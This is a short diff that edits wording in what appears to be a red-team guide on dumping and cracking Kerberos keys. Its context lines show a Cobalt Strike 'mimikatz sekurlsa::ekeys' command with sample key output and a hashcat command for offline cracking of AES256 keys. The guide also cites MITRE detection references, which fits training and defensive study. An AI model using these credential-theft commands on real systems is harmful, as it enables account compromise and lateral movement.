@@ -57,7 +57,7 @@ beacon> mimikatz sekurlsa::ekeys
 #   des_cbc_md4 05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
 # In this sample output, Mimikatz incorrectly labels the AES256 key as des_cbc_md4.
 
-# Crack the AES256 key offline; sha256.hash is the filename used in the lab
+# Crack the AES256 key offline; sha256.hash is the filename used in the example
 # Input format: $krb5db$18$<username>$<DOMAIN-FQDN>$<AES256_KEY>
 PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
 
@@ -124,7 +124,7 @@ Accessing LSASS or protected secrets can trigger alerts. BOFs, signed tools and 
 | Hashcat rejects input | Algorithm, format, username and iterations |
 | No password recovered | Dictionary, rules and password strength; this does not prove the hash is invalid |
 
-Source references: [MITRE LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) and [LSA Secrets detection](https://attack.mitre.org/detectionstrategies/DET0437/).
+References: [MITRE LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) and [LSA Secrets detection](https://attack.mitre.org/detectionstrategies/DET0437/).
 
 ## 8. Quick checklist
 
